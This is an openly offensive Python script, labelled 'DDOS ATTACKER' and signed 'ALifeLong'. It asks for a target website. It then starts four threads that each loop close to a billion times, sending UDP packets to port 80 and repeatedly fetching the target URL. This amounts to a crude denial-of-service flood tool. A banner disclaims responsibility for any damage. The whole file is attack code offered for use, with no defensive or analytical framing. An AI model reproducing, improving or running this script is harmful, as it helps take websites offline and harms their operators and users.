import threading, time, urllib.request, socket

byte = 10000
amount = 999999999
port = 80
message = "01jsbbka0123bkasjhd2012390hjakjsbdkj19293081923hjkbjkabsd910283912jhhsudas90d8a9sd0as8d0"
message = message.encode()

print("DDOS ATTACKER\nBy: ALifeLong\n-----------------------------------\n>>REMEMBER THAT ANY DAMAGE CAUSED BY THIS PROGRAM IS NOT MY RESPONSIBLITY<<\n")
print("Enter The Website To Attack")
url = input(str(""))
print("\nEnter The Website Without HTTP/HTTPS")
urls = input(str(""))
print("\n>>LOADING [Thread1,Thread2,Thread3,Thread4]\n-------------------------------")
time.sleep(5)

def thread1():
    print(">>Thread1 Is Attacking...\n")
    time.sleep(1)
    for i in range(amount):
        print("[Thread1]ATTACKED")
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect((urls,port))
        s.send(message)
        connect = urllib.request.urlopen(url)
        output = connect.read()
        connect.close()

def thread2():
    print(">>Thread2 Is Attacking...\n")
    time.sleep(1)
    for i in range(amount):
        print("[Thread2]ATTACKED")
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect((urls,port))
        s.send(message)
        connect = urllib.request.urlopen(url)
        output = connect.read()
        connect.close()

def thread3():
    print(">>Thread3 Is Attacking...\n")
    time.sleep(1)
    for i in range(amount):
        print("[Thread3]ATTACKED")
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect((urls,port))
        s.send(message)
        connect = urllib.request.urlopen(url)
        output = connect.read()
        connect.close()

def thread4():
    print(">>Thread4 Is Attacking...\n")
    time.sleep(1)
    for i in range(amount):
        print("[Thread4]ATTACKED")
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect((urls,port))
        s.send(message)
        connect = urllib.request.urlopen(url)
        output = connect.read()
        connect.close()


t1 = threading.Thread(target = thread1 , name = "run1")
t2 = threading.Thread(target = thread2 , name = "run2")
t3 = threading.Thread(target = thread3 , name = "run3")
t4 = threading.Thread(target = thread4 , name = "run4")

t1.start()
t2.start()
t3.start()
t4.start()

